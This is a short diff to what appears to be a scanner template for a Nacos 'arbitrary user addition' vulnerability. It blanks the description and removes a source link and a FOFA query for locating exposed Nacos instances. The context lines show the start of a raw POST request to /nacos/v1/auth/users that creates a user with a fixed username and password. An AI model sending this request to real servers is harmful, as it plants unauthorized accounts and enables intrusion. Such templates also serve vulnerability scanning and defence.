@@ -3,12 +3,8 @@ info:
   name: Nacos 任意用户添加漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bzrr9gvcx7ggg6pd'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bzrr9gvcx7ggg6pd
-    fofa: app="nacos"
 http:
 - raw:
   - 'POST /nacos/v1/auth/users?username=dudesite&password=dudesite HTTP/1.1
